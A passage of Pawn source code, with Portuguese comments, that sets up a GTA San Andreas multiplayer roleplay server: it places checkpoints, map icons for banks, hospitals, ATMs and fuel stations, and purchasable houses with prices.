    CP_59 =	CreateDynamicCP(1567.1863,-1672.5286,15.2505, 1.5, -1, -1, -1, 100.0); // Bebedouro
    CP_60 =	CreateDynamicCP(1563.5764,-1657.0508,20.5895, 1.5, -1, -1, -1, 100.0); // Bebedouro
    //-- Checkpoints
    CP_6 = CreateDynamicCP(775.2586, -59.2147, 1000.7184, 1.5, -1, -1, -1, 100.0); // Academia
    CP_7 = CreateDynamicCP(446.9114, -1875.3275, 4.3723, 1.5, -1, -1, -1, 100.0); // Cooperativa de Pesca
	CP_9 = CreateDynamicCP(1749.9469, -1953.7769, 13.5469, 5.0, -1, -1, -1, 100.0); // Maquinista Saída LS
	CP_10 = CreateDynamicCP(1405.4850, 2632.4202, 10.8203, 5.0, -1, -1, -1, 100.0); // Maquinista Saída LV
	CP_11 = CreateDynamicCP(-1944.2952, 109.4343, 25.7186, 5.0, -1, -1, -1, 100.0); // Maquinista Saída SF
    CP_12 = CreateDynamicCP(-1067.3206, -1189.6003, 129.2188, 1.5, -1, -1, -1, 100.0); // Fazenda das Drogas
    CP_13 = CreateDynamicCP(2337.7983, 1723.8367, 10.8203, 1.5, -1, -1, -1, 100.0); // Fotógrafo
    CP_14 = CreateDynamicCP(1172.6395, -1328.1166, 15.4027, 1.1, -1, -1, -1, 100.0); // Hospital Agência
    CP_15 = CreateDynamicCP(2034.8190, -1406.5873, 17.2047, 1.1, -1, -1, -1, 100.0); // Hospital Grove
	CP_16 = CreateDynamicCP(2201.8445,-1152.3496,25.8772, 1.1, -1, -1, -1, 100.0); // Kit Favela
	CP_17 = CreateDynamicCP(2072.6030, -2298.4436, 13.5469, 5.0, -1, -1, -1, 100.0); // CP TRANSPORTADOR
	CP_22 = CreateDynamicCP(-1737.9109,30.8485,3.5547, 1.1, -1, -1, -1, 100.0); // CP TRANSPORTADOR
	CP_23 = CreateDynamicCP(359.0632,178.6568, 1008.3828, 1.1, -1, -1, -1, 100.0); // Impostos Prefeitura
	CP_24 = CreateDynamicCP(1567.8768,-1675.5853,15.2505, 1.1, -1, -1, -1, 100.0); // Porte de Armas Delegacia
	CP_25 = CreateDynamicCP(313.62061, -139.51691, 1003.05670, 1.1, -1, -1, -1, 100.0); // Armas Ammu-Nation
	CP_29 = CreateDynamicCP(358.9193, 166.1699, 1008.3828, 1.3, -1, -1, -1, 100.0); // Prefeitura
	CP_30 = CreateDynamicCP(2278.4102, -2329.2820, 13.5469, 5.0, -1, -1, -1, 100.0); // Àrea de Ônibus
	//CP_31 = CreateDynamicCP(-543.7710, -498.8596, 25.2147, 10.0, -1, -1, -1, 100.0); // Mercadoria 1
	CP_35 = CreateDynamicCP(1777.8369,-1702.6061,12.7, 1.0, -1, -1, -1, 100.0); // Impostos Banco
	CP_37 = CreateDynamicCP(362.3257,173.7074,1008.3828, 1.0, -1, -1, -1, 100.0); // Impostos Loteria
	//CP_38 = CreateDynamicCP(2205.2078, -989.1382, 63.9297, 1.5, -1, -1, -1, 100.0); // Biqueira Favela
	CP_39 = CreateDynamicCP(-2050.7473, 66.9856, 28.3906, 1.5, -1, -1, -1, 100.0); // Corpo de Bombeiros
	CP_40 = CreateDynamicCP(-1737.9591, 24.8926, 3.5547, 1.5, -1, -1, -1, 100.0); // Mercadoria Empresas(àrea de descarga)
	// Check dos caixas eletronicos
    cCaixas[0]  = CreateDynamicCP(1401.8698, -1177.8055, 25.9922, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[1] = CreateDynamicCP(2005.8110, -1409.0641, 16.9922, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[2] = CreateDynamicCP(1929.2642, -1769.0115, 12.5469, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[3] = CreateDynamicCP(1363.0376, -1750.0898, 13.5274, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[4] = CreateDynamicCP(1145.6055, -1772.0370, 16.5992, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[5] = CreateDynamicCP(397.5773, -1805.5364, 7.8379, 1.0, -1, -1, -1, 100.0); // Trocado
    cCaixas[6] = CreateDynamicCP(1286.1268, -1305.7277, 13.5470, 1.0, -1, -1, -1, 100.0); // Trocado
	cCaixas[7] = CreateDynamicCP(1985.3488, 1075.9269, 10.8127, 1.0, -1, -1, -1, 100.0); // Caixa 1 LV
	cCaixas[8] = CreateDynamicCP(2086.7527, 1471.3977, 10.8203, 1.0, -1, -1, -1, 100.0); // Caixa 2 LV
	cCaixas[9] = CreateDynamicCP(1673.8544, 1444.8619, 10.7920, 1.0, -1, -1, -1, 100.0); // Caixa 3 LV
	cCaixas[10] = CreateDynamicCP(2172.4304, 1402.2052, 11.0625, 1.0, -1, -1, -1, 100.0); // Caixa 4 LV
	cCaixas[11] = CreateDynamicCP(2803.6138, 892.6180, 10.7500, 1.0, -1, -1, -1, 100.0); // Caixa 5 LV
	cCaixas[12] = CreateDynamicCP(-2702.8171, 372.6496, 4.9781, 1.0, -1, -1, -1, 100.0); // Caixa 1 SF
	cCaixas[13] = CreateDynamicCP(-2446.7327, 751.8239, 35.1719, 1.0, -1, -1, -1, 100.0); // Caixa 2 SF
	cCaixas[14] = CreateDynamicCP(-2629.7937, 1401.6936, 7.0994, 1.0, -1, -1, -1, 100.0); // Caixa 3 SF
	cCaixas[15] = CreateDynamicCP(-1694.3392, 412.6917, 7.1797, 1.0, -1, -1, -1, 100.0); // Caixa 4 SF
	cCaixas[16] = CreateDynamicCP(-1968.2924, 278.5286, 35.1794, 1.0, -1, -1, -1, 100.0); // Caixa 5 SF
	cCaixas[17] = CreateDynamicCP(-2234.2275, 2350.0652, 4.9855, 1.0, -1, -1, -1, 100.0); // Caixa Bayside
	cCaixas[18] = CreateDynamicCP(-1453.6864, 2593.2837, 55.8359, 1.0, -1, -1, -1, 100.0); // Caixa Deserto
	cCaixas[19] = CreateDynamicCP(-230.0132, 2709.8633, 62.9843, 1.0, -1, -1, -1, 100.0); // Caixa Deserto
	cCaixas[20] = CreateDynamicCP(-828.2064, 1503.2640, 19.6672, 1.0, -1, -1, -1, 100.0); // Caixa Deserto
	cCaixas[21] = CreateDynamicCP(-189.9725, 1209.8292, 19.7422, 1.0, -1, -1, -1, 100.0); // Caixa Fort Carson
	cCaixas[22] = CreateDynamicCP(241.5081, -167.8019, 1.5781, 1.0, -1, -1, -1, 100.0); // Caixa Cidadezinha
	cCaixas[23] = CreateDynamicCP(673.0540, -506.8918, 16.3359, 1.0, -1, -1, -1, 100.0); // Caixa Cidadezinha
	cCaixas[24] = CreateDynamicCP(-2162.7546, -2341.4189, 30.6250, 1.0, -1, -1, -1, 100.0); // Caixa Cidadezinha
	cCaixas[25] = CreateDynamicCP(2303.1123, -16.1575, 26.4844, 1.0, -1, -1, -1, 100.0); // Caixa Cidadezinha
	cCaixas[26] = CreateDynamicCP(1306.2826, 232.1539, 19.5547, 1.0, -1, -1, -1, 100.0); // Caixa Cidadezinha
 	CreateDynamicCP(1389.1869, -2688.5435, 13.5391, 1.1, -1, -1, -1, 100.0); // Acesso Ilha
    CreateDynamicCP(2583.9419, -3411.9502, 1.3900, 1.1, -1, -1, -1, 100.0); // Acesso Terra
	//-- MapIcons
 	ServerICON[0] = CreateDynamicMapIcon(1555.1055, -1675.6426, 16.1953, 30,0,-1, -1, -1, 150.0); // Delegacia
    ServerICON[1] = CreateDynamicMapIcon(1836.5631, -1682.5184, 13.3427, 17,0,-1, -1, -1, 150.0); // Alhambra
    ServerICON[2] = CreateDynamicMapIcon(1310.4525,-1367.4639,13.4724, 56,0,-1, -1, -1, 150.0); // Agência LS
    //ServerICON[3] = CreateDynamicMapIcon(-2650.2886, 376.0364, 6.1563, 56,0,-1, -1, -1, 150.0); // Agência SF
    ServerICON[3] = CreateDynamicMapIcon(-2227.2854, 251.9700, 35.3203, 56,0,-1, -1, -1, 150.0); // Agência SF
    ServerICON[4] = CreateDynamicMapIcon(1952.8214,1342.8403,15.3672, 56,0,-1, -1, -1, 150.0); // Agência LV
    ServerICON[5] = CreateDynamicMapIcon(-206.9538,1119.1993,20.4297, 56,0,-1, -1, -1, 150.0); // Agência Fort Carson
    ServerICON[6] = CreateDynamicMapIcon(207.8856, -62.8081, 1.5781, 56,0,-1, -1, -1, 150.0); // Agência BlueBerry
    ServerICON[7] = CreateDynamicMapIcon(-2130.4309,-2434.8296,30.6250, 56,0,-1, -1, -1, 150.0); // Agência Angeç Pine
    ServerICON[8] = CreateDynamicMapIcon(1778.3708, -1721.8687, 13.4134, 52,0,-1, -1, -1, 150.0); // Banco Los Santos
    ServerICON[9] = CreateDynamicMapIcon(2127.5425,2378.9783,10.8203, 52,0,-1, -1, -1, 150.0); // Banco Las Ventura
    //ServerICON[10] = CreateDynamicMapIcon(-2765.3723, 375.5843, 6.3359, 52,0,-1, -1, -1, 150.0); // Banco San Fierro
    ServerICON[10] = CreateDynamicMapIcon(-2425.3201, 337.5206, 37.0020, 52,0,-1, -1, -1, 150.0); // Banco San Fierro
    ServerICON[11] = CreateDynamicMapIcon(1657.9943, -1343.3003, 17.4365, 36,0,-1, -1, -1, 150.0); // Auto Escola
    ServerICON[12] = CreateDynamicMapIcon(1352.4087, -1759.2499, 13.5078, 17,0,-1, -1, -1, 150.0); // 24/7
    ServerICON[13] = CreateDynamicMapIcon(1631.8516, -1172.9270, 24.0843, 25,0,-1, -1, -1, 150.0); // Loterica
   	ServerICON[14] = CreateDynamicMapIcon(1749.9469, -1953.7769, 13.5469, 53,0,-1, -1, -1, 150.0); // Estação LS
    ServerICON[15] = CreateDynamicMapIcon(1405.4850, 2632.4202, 10.8203, 53,0,-1, -1, -1, 150.0); // Estação LV
    ServerICON[16] = CreateDynamicMapIcon(-1944.2952, 109.4343, 25.7186, 53,0,-1, -1, -1, 150.0); // Estação SF
    ServerICON[17] = CreateDynamicMapIcon(1481.0233,-1771.7765,18.7957, 42,0,-1, -1, -1, 150.0); // Prefeitura LS
    ServerICON[96] = CreateDynamicMapIcon(-2765.3511, 375.5041, 6.3359, 42,0,-1, -1, -1, 150.0); // Prefeitura SF
    ServerICON[97] = CreateDynamicMapIcon(646.0756, -2244.9697, 43.5413, 12,0,-1, -1, -1, 150.0); // Cruzeiro LS
    ServerICON[98] = CreateDynamicMapIcon(2782.3127,-2019.6082,13.5547, 33,0,-1, -1, -1, 150.0); // Quadra de basquete

    ServerICON[18] = CreateDynamicMapIcon(-1605.4912, 711.4242, 13.8672, 30,0,-1, -1, -1, 150.0); // Delegacia SF
    ServerICON[19] = CreateDynamicMapIcon(445.1704, -1896.1055, 1.6778, 9,0,-1, -1, -1, 150.0); // Pesca Saida
    ServerICON[20] = CreateDynamicMapIcon(455.8510, -2441.9895, -0.1633, 9,0,-1, -1, -1, 150.0); // Area Pesca
	ServerICON[21] = CreateDynamicMapIcon(1708.7620, -1793.4124, 14.6142, 27,0,-1, -1, -1, 150.0); // Officina de tuning
	ServerICON[22] = CreateDynamicMapIcon(-616.8596, -1996.0758, 49.6114, 12,0,-1, -1, -1, 150.0); // Area de Caça
	ServerICON[23] = CreateDynamicMapIcon(22.5946, -2646.7556, 40.4648, 12,0,-1, -1, -1, 150.0); // Coop de Caça
	ServerICON[24] = CreateDynamicMapIcon(1675.1864, -2287.8503, 49.9596, 5,0,-1, -1, -1, 150.0); // Aero Los Santos
	ServerICON[25] = CreateDynamicMapIcon(2729.4973, -2461.6406, 26.6747, 51,0,-1, -1, -1, 150.0); // Area de Carregamento
	ServerICON[26] = CreateDynamicMapIcon(1434.2729,997.0547,10.9297, 51,0,-1, -1, -1, 150.0); // Area de Descarregamento LV
	ServerICON[27] = CreateDynamicMapIcon(-1068.3540,-642.2197,32.0078, 51,0,-1, -1, -1, 150.0); // Area de Descarregamento SF
	ServerICON[28] = CreateDynamicMapIcon(-1116.3617, -1134.3395, 129.2259, 16,0,-1, -1, -1, 150.0); // Fazenda das Drogas
	ServerICON[29] = CreateDynamicMapIcon(-1116.3617, -1134.3395, 129.2259, 18,0,-1, -1, -1, 150.0); // Fazenda das Armas
	ServerICON[30] = CreateDynamicMapIcon(1173.1145, -1323.7125, 15.3962, 22,0,-1, -1, -1, 150.0); // Hospital LS Ammu-Nation
	ServerICON[31] = CreateDynamicMapIcon(2036.5521, -1412.5513, 16.9922, 22,0,-1, -1, -1, 150.0); // Hostpital LS Favela
	ServerICON[32] = CreateDynamicMapIcon(1607.4396, 1819.1462, 10.8280, 22,0,-1, -1, -1, 150.0); // Hospital LV
	ServerICON[33] = CreateDynamicMapIcon(-2665.0503, 636.5155, 14.4531, 22,0,-1, -1, -1, 150.0); // Hospital SF
	ServerICON[34] = CreateDynamicMapIcon(-315.0838, 1050.7095, 20.3403, 22,0,-1, -1, -1, 150.0); // Hospital FC
	ServerICON[35] = CreateDynamicMapIcon(-1514.6455, 2523.4263, 55.8138, 22,0,-1, -1, -1, 150.0); // Hospital EQ
	ServerICON[36] = CreateDynamicMapIcon(-2208.2485, -2286.8516, 30.6250, 22,0,-1, -1, -1, 150.0); // Hospital AP
	ServerICON[37] = CreateDynamicMapIcon(2131.4861, -973.9576, 59.7856, 24,0,-1, -1, -1, 150.0); // Duelo
	ServerICON[38] = CreateDynamicMapIcon(-1704.5747, 15.8101, 3.5547, 26,0,-1, -1, -1, 150.0); // Transportador
	ServerICON[39] = CreateDynamicMapIcon(2278.4102, -2329.2820, 13.5469, 8,0,-1, -1, -1, 150.0); // Area de Ônibus
	// Cifão R$
    ServerICON[40] = CreateDynamicMapIcon(1401.8698, -1177.8055, 25.9922, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Comerce
    ServerICON[41] = CreateDynamicMapIcon(2005.8110, -1409.0641, 16.9922, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Victim
    ServerICON[42] = CreateDynamicMapIcon(1929.2642, -1769.0115, 13.5469, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Binco
    ServerICON[43] = CreateDynamicMapIcon(1363.0376, -1750.0898, 13.5274, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Ammu
    ServerICON[44] = CreateDynamicMapIcon(1145.6055, -1772.0370, 16.5992, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Agencia
    ServerICON[45] = CreateDynamicMapIcon(397.5773, -1805.5364, 7.8379, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Posto Norte
    ServerICON[46] = CreateDynamicMapIcon(1286.1268, -1305.7277, 13.5470, 52,0,-1, -1, -1, 150.0); // Caixa Eletronico Posto Sul
	ServerICON[47] = CreateDynamicMapIcon(1985.3488, 1075.9269, 10.8127, 52,0,-1, -1, -1, 150.0); // Caixa 1 LV
	ServerICON[48] = CreateDynamicMapIcon(2086.7527, 1471.3977, 10.8203, 52,0,-1, -1, -1, 150.0); // Caixa 2 LV
	ServerICON[49] = CreateDynamicMapIcon(1673.8544, 1444.8619, 10.7920, 52,0,-1, -1, -1, 150.0); // Caixa 3 LV
	ServerICON[50] = CreateDynamicMapIcon(2172.4304, 1402.2052, 11.0625, 52,0,-1, -1, -1, 150.0); // Caixa 4 LV
	ServerICON[51] = CreateDynamicMapIcon(2803.6138, 892.6180, 10.7500, 52,0,-1, -1, -1, 150.0); // Caixa 5 LV
	ServerICON[52] = CreateDynamicMapIcon(-2702.8171, 372.6496, 4.9781, 52,0,-1, -1, -1, 150.0); // Caixa 1 SF
	ServerICON[53] = CreateDynamicMapIcon(-2446.7327, 751.8239, 35.1719, 52,0,-1, -1, -1, 150.0); // Caixa 2 SF
	ServerICON[54] = CreateDynamicMapIcon(-2629.7937, 1401.6936, 7.0994, 52,0,-1, -1, -1, 150.0); // Caixa 3 SF
	ServerICON[55] = CreateDynamicMapIcon(-1694.3392, 412.6917, 7.1797, 52,0,-1, -1, -1, 150.0); // Caixa 4 SF
	ServerICON[56] = CreateDynamicMapIcon(-1968.2924, 278.5286, 35.1794, 52,0,-1, -1, -1, 150.0); // Caixa 5 SF
	ServerICON[57] = CreateDynamicMapIcon(-2234.2275, 2350.0652, 4.9855, 52,0,-1, -1, -1, 150.0); // Caixa Bayside
	ServerICON[58] = CreateDynamicMapIcon(-1453.6864, 2593.2837, 55.8359, 52,0,-1, -1, -1, 150.0); // Caixa Deserto
	ServerICON[59] = CreateDynamicMapIcon(-230.0132, 2709.8633, 62.9843, 52,0,-1, -1, -1, 150.0); // Caixa Deserto
	ServerICON[60] = CreateDynamicMapIcon(-828.2064, 1503.2640, 19.6672, 52,0,-1, -1, -1, 150.0); // Caixa Deserto
	ServerICON[61] = CreateDynamicMapIcon(-189.9725, 1209.8292, 19.7422, 52,0,-1, -1, -1, 150.0); // Caixa Fort Carson
	ServerICON[62] = CreateDynamicMapIcon(241.5081, -167.8019, 1.5781, 52,0,-1, -1, -1, 150.0); // Caixa Cidadezinha
	ServerICON[63] = CreateDynamicMapIcon(673.0540, -506.8918, 16.3359, 52,0,-1, -1, -1, 150.0); // Caixa Cidadezinha
	ServerICON[64] = CreateDynamicMapIcon(-2162.7546, -2341.4189, 30.6250, 52,0,-1, -1, -1, 150.0); // Caixa Cidadezinha
	ServerICON[65] = CreateDynamicMapIcon(2303.1123, -16.1575, 26.4844, 52,0,-1, -1, -1, 150.0); // Caixa Cidadezinha
	ServerICON[66] = CreateDynamicMapIcon(1306.2826, 232.1539, 19.5547, 52,0,-1, -1, -1, 150.0); // Caixa Cidadezinha
	// Postos
	ServerICON[67] = CreateDynamicMapIcon(1940.6096,-1772.7147,12.9500, 19,0,-1, -1, -1, 150.0);
	ServerICON[68] = CreateDynamicMapIcon(-90.8525,-1169.3555,1.9823, 19,0,-1, -1, -1, 150.0);
	ServerICON[69] = CreateDynamicMapIcon(-1607.8698,-2715.5637,48.9453, 19,0,-1, -1, -1, 150.0);
	ServerICON[70] = CreateDynamicMapIcon(-2244.2200,-2560.6169,31.9219, 19,0,-1, -1, -1, 150.0);
	ServerICON[71] = CreateDynamicMapIcon(-2026.7922,156.5871,29.0391, 19,0,-1, -1, -1, 150.0);
	ServerICON[72] = CreateDynamicMapIcon(-2410.0215,976.2697,45.4209, 19,0,-1, -1, -1, 150.0);
	ServerICON[73] = CreateDynamicMapIcon(-1328.4185,2675.4663,50.0625, 19,0,-1, -1, -1, 150.0);
	ServerICON[74] = CreateDynamicMapIcon(1596.2703,2198.8335,10.8203, 19,0,-1, -1, -1, 150.0);
	ServerICON[75] = CreateDynamicMapIcon(2639.4871,1106.6412,10.8203, 19,0,-1, -1, -1, 150.0);
	ServerICON[76] = CreateDynamicMapIcon(2114.7256,920.3104,10.8203, 19,0,-1, -1, -1, 150.0);
	ServerICON[77] = CreateDynamicMapIcon(1004.8821,-937.0840,42.3281, 19,0,-1, -1, -1, 150.0);
	ServerICON[78] = CreateDynamicMapIcon(1382.6870,459.7101,20.3452, 19,0,-1, -1, -1, 150.0);
	ServerICON[79] = CreateDynamicMapIcon(-1676.3906,412.9636,6.9068, 19,0,-1, -1, -1, 150.0);
	ServerICON[80] = CreateDynamicMapIcon(70.4693,1218.8176,18.5393, 19,0,-1, -1, -1, 150.0);
	ServerICON[81] = CreateDynamicMapIcon(613.1774,1692.8209,7.1875, 19,0,-1, -1, -1, 150.0);
	ServerICON[82] = CreateDynamicMapIcon(2147.0969,2747.4377,10.5474, 19,0,-1, -1, -1, 150.0);
	ServerICON[83] = CreateDynamicMapIcon(2202.2954,2474.0007,10.5474, 19,0,-1, -1, -1, 150.0);
	ServerICON[84] = CreateDynamicMapIcon(655.3937,-565.2368,15.9072, 19,0,-1, -1, -1, 150.0);
	// Centro de Eventos
	ServerICON[85] = CreateDynamicMapIcon(-280.0119,1530.6389,77.9008, 13,0,-1, -1, -1, 150.0);
	// Radares
	ServerICON[86] = CreateDynamicMapIcon(1700.77087, 414.56015, 30.00000, 34,0,-1, -1, -1, 150.0); // 1
	ServerICON[87] = CreateDynamicMapIcon(-1220.04248, -769.33087, 63.00000, 34,0,-1, -1, -1, 150.0); // 2
	ServerICON[88] = CreateDynamicMapIcon(-143.34355, -1318.30847, 1.40000, 34,0,-1, -1, -1, 150.0); // 3
	ServerICON[89] = CreateDynamicMapIcon(660.9880,666.7653, 6.60294, 34,0,-1, -1, -1, 150.0); // 4
	ServerICON[90] = CreateDynamicMapIcon(-1637.78394, 2013.41296, 17.66738, 34,0,-1, -1, -1, 150.0); // 5
	ServerICON[91] = CreateDynamicMapIcon(-2681.42578, 1956.42688, 62.27490, 34,0,-1, -1, -1, 150.0); // 6
	ServerICON[92] = CreateDynamicMapIcon(-1772.58240, -1441.72498, 34.25580, 34,0,-1, -1, -1, 150.0); // 7
	ServerICON[93] = CreateDynamicMapIcon(-1065.33606, -2857.72314, 66.69350, 34,0,-1, -1, -1, 150.0); // 8
	ServerICON[94] = CreateDynamicMapIcon(2760.43213, -102.90350, 34.08050, 34,0,-1, -1, -1, 150.0); // 9
	// Novos Icons
	ServerICON[95] = CreateDynamicMapIcon(2770.6172, -1627.9358, 12.1775, 2,0,-1, -1, -1, 150.0); // 9
	// Aero Fort Carson
	ServerICON[95] = CreateDynamicMapIcon(37.1022, 1399.7941, 13.3013, 57,0,-1, -1, -1, 150.0); // Pista
	ServerICON[95] = CreateDynamicMapIcon(-32.4719, 1397.3483, 17.3454, 5,0,-1, -1, -1, 150.0); // Terminal
	//-- Criar Casas
	CriarCasa(1, -684.6587, 939.5399, 13.6328, 83.0864, 1324.3145, 1083.8594, 9, 200000, 200000, 1, 101);
	CriarCasa(2, 1496.9918,-689.0601,95.1433, 24.0932, 1341.7411, 1084.3750, 10, 220000, 220000, 2, 102);
	CriarCasa(3, 1331.7549,-632.3055,109.1349, 2237.4912, -1080.2360, 1049.0234, 2, 200000, 200000, 3, 103);
	CriarCasa(4, 2522.3486,-1679.3895,15.4970, -68.5478, 1353.0201, 1080.2109, 6, 70000, 70000, 4, 104);
	CriarCasa(5, 2523.7576,-1658.6222,15.4935, 245.2656, 305.0070, 999.1484, 1, 65000, 65000, 5, 105);
	CriarCasa(6, 2513.2834,-1650.7628,14.3557, 224.3667, 1240.1123, 1082.1406, 2, 63000, 63000, 6, 106);
	CriarCasa(7, 2498.4519,-1643.6329,13.7826, 224.4046, 1239.8674, 1082.1406, 2, 60000, 60000, 7, 107);
	CriarCasa(8, 2486.4622,-1645.8593,14.0703, -42.5853, 1406.8448, 1084.4297, 8, 58000, 58000, 8, 108);
	CriarCasa(9, 2451.9099,-1642.5935,13.7357, -68.5145, 1353.8485, 1080.2109, 6, 61000, 61000, 9, 109);
	CriarCasa(10, 2066.1677,-1703.4937,14.1484, 261.2870, 1284.3062, 1080.2578, 4, 70000, 70000, 10, 110);
	CriarCasa(12, 1981.5452,-1718.9211,17.0303, 261.2870, 1284.3062, 1080.2578, 4, 100000, 100000, 12, 112);
	CriarCasa(13, 1410.9694,-921.5505,38.4219, 294.9558, 1472.2637, 1080.2578, 15, 130000, 130000, 13, 113);
	CriarCasa(14, 1534.4147, -800.1628, 72.8495, -68.5478, 1353.0201, 1080.2109, 6, 110000, 110000, 14, 114);
	CriarCasa(15, 1526.9944,-773.4356,80.5474, -42.5196, 1405.5847, 1084.4297, 8, 110000, 110000, 15, 115);
	CriarCasa(16, 1442.6061, -629.5621, 95.7186, 221.7965, 1142.2682, 1082.6094, 4, 140000, 140000, 16, 116);
	CriarCasa(18, 1111.5037,-742.0931,100.1329, 22.6554, 1405.0906, 1084.4297, 5, 150000, 150000, 18, 118);
	CriarCasa(19, 1094.8571,-646.5363,113.6484, 140.3679, 1367.8837, 1083.8621, 5, 200000, 200000, 19, 119);
	CriarCasa(20, 1045.0305, -642.0552, 120.1172, 2317.8652, -1025.5160, 1050.2109, 9, 190000, 190000, 20, 120);
	CriarCasa(21, 979.8599,-676.2302,121.9763, 234.0908,1065.5974, 1084.2095, 6, 230000, 230000, 21, 121);
	CriarCasa(22, 945.7899,-709.7903,122.2109, 260.7421, 1238.2261, 1084.2578, 9, 100000, 100000, 22, 122);
	CriarCasa(23, 899.1617,-677.9343,116.8904, 2237.4912, -1080.2360, 1049.0234, 2, 140000, 140000, 23, 123);
	CriarCasa(24, 849.1844,-744.4493,94.9693, -262.5375, 1456.7291, 1084.3672, 4, 100000, 100000, 24, 124);
	CriarCasa(25, 890.5619,-781.4048,101.2954, 446.9973, 1398.4043, 1084.3120, 2, 115000, 115000, 25, 125);
	CriarCasa(26, 497.5117,-1093.6302,82.3592, 2365.0583, -1134.3385, 1050.8750, 8, 140000, 140000, 26, 126);
	CriarCasa(27, 299.9188,-1154.8226,81.1709, 228.9857, 1114.1838, 1080.9922, 5, 250000, 250000, 27, 127);
	CriarCasa(28, 252.1526,-1221.1609,75.6725, 82.9644, 1323.7074, 1083.8594, 9, 240000, 240000, 28, 128);
	CriarCasa(29, 252.7280,-1269.3767,74.0825, 235.3623, 1188.6174, 1080.2578, 3, 230000, 230000, 29, 129);
	CriarCasa(30, 255.1223, -1366.6436, 53.1094, 294.9558, 1472.2637, 1080.2578, 15, 150000, 150000, 30, 130);
	CriarCasa(31, 298.3224, -1337.7108, 53.4415, 2194.9250, -1204.2581, 1049.0234, 6, 130000, 130000, 31, 131);
	CriarCasa(32, 190.2035, -1308.1805, 70.2614, 226.2988, 1114.4376, 1080.9929, 5, 100000, 100000, 32, 132);
	CriarCasa(33, 726.9389, -1276.2460, 13.6484, 225.6608, 1021.8754, 1084.0165, 7, 500000, 500000, 33, 133);
	CriarCasa(35, 2459.4136,-1690.1783,13.5453, 2466.0623, -1698.2185, 1013.5078, 2, 100000, 100000, 35, 135);
	CriarCasa(36, 1298.5170,-799.4630,84.1406, 1262.4103, -785.4581, 1091.9063, 5, 1000000, 1000000, 36, 136);
	CriarCasa(37, -81.1509, 83.0017, 3.1172, -68.5478, 1353.0201, 1080.2109, 6, 120000, 120000, 37, 137);
	CriarCasa(38, -902.7215, 2681.5513, 42.3703, 271.884979, 306.631988, 999.148437, 2, 350000, 350000, 38, 138);
    CriarCasa(39, 1854.0656, -1914.9202, 15.2568, -68.5478, 1353.0201, 1080.2109, 6, 15000, 15000, 39, 139);
    CriarCasa(40, 1872.2916, -1912.5028, 15.2568, -68.5478, 1353.0201, 1080.2109, 6, 15000, 15000, 40, 140);
    CriarCasa(41, 1891.9188, -1915.1726, 15.2568, -68.5478, 1353.0201, 1080.2109, 6, 15000, 15000, 41, 141);
    CriarCasa(42, 1938.1080, -1911.3516, 15.2568, -68.5478, 1353.0201, 1080.2109, 6, 10000, 10000, 42, 142);
    CriarCasa(43, 1913.5016, -1912.3480, 15.2568, -68.5478, 1353.0201, 1080.2109, 6, 15000, 15000, 43, 143);
    CriarCasa(44, 1123.9729, -2036.9758, 69.8855, 140.3546, 1365.9296, 1083.8594, 5, 1000000, 1000000, 44, 144);
    CriarCasa(48, 693.5538,-1705.8082,3.8195, 83.0864, 1324.3145, 1083.8594, 9, 180000, 180000, 48, 148);
	CriarCasa(51, 2824.040771, 2268.726562, 14.661463, 2233.6101, -1114.2667, 1050.8828, 5, 50000, 50000, 51, 151);
	CriarCasa(52, 2794.183105, 2229.475341, 14.661463, 2309.0664, -1212.7429, 1049.0234, 6, 60000, 60000, 52, 152);
	CriarCasa(53, 2532.322998, 750.092834, 14.739588, 2237.6770,-1080.4869,1049.0234, 2, 65000, 65000, 53, 153);
	CriarCasa(54, 2613.505615, 719.506408, 14.739588, 2365.1567, -1134.5105, 1050.8750, 8, 65000, 65000, 54, 154);
	CriarCasa(55, 2449.223632, 689.810668, 11.460937, 2365.1567, -1134.5105, 1050.8750, 8, 90000, 90000, 55, 155);
	CriarCasa(56, 2346.135009, 656.637695, 11.460479, 225.4087, 1240.1775, 1082.1406, 2, 90000, 90000, 56, 156);
	CriarCasa(57, 2206.353271, 656.629699, 11.468292, -42.3936, 1406.0759, 1084.4297, 8, 90000, 90000, 57, 157);
	CriarCasa(58, 2369.060302, 735.193542, 11.460937, 376.5438, 1417.5194, 1081.3281, 15, 85000, 85000, 58, 158);
	CriarCasa(59, 2205.900146, 736.629394, 11.468292, 387.1854, 1471.9427, 1080.1875, 15, 85000, 85000, 59, 159);
	CriarCasa(60, 2123.279541, 651.314392, 11.460937, 260.6836,1238.0439,1084.2578, 9, 90000, 90000, 60, 160);
	CriarCasa(61, 2069.005859, 696.627990, 11.468292, 223.0062, 1287.1655, 1082.1406, 1, 75000, 75000, 61, 161);
	CriarCasa(62, 2014.135375, 775.196838, 11.460937, -68.63, 1351.83, 1080.21, 6, 80000, 70000, 62, 162);
	CriarCasa(63, 2122.531738, 731.265197, 11.460937, 295.7500,1474.5068,1080.2578, 15, 80000, 80000, 63, 163);
	CriarCasa(64, 2169.355224, 772.358276, 11.460937, 221.8483, 1140.6533, 1082.6094, 4, 70000, 70000, 64, 164);
	CriarCasa(65, 1843.995117, 718.703125, 11.468292, 225.4087, 1240.1775, 1082.1406, 2, 75000, 75000, 65, 165);
	CriarCasa(66, 1896.745117, 675.111328, 10.820312, 2309.0664, -1212.7429, 1049.0234, 6, 90000, 90000, 66, 166);
	CriarCasa(67, 1896.742187, 736.557556, 10.820312, 2233.6101, -1114.2667, 1050.8828, 5, 90000, 90000, 67, 167);
	CriarCasa(68, 1957.045043, 731.335327, 10.820312, 2333.2029,-1076.5475,1049.0234, 6, 90000, 90000, 68, 168);
	CriarCasa(69, 1957.041992, 678.000000, 10.820312, 266.8205, 305.0191, 999.1484, 2, 90000, 90000, 69, 169);
	CriarCasa(70, 1414.428100, 2003.911376, 14.739588, 2283.3472,-1139.6055,1050.8984, 11, 80000, 80000, 70, 170);
	CriarCasa(71, -2383.799316, 1128.145751, 55.726562, 223.0062, 1287.1655, 1082.1406,  1, 90000, 80000, 71, 171);
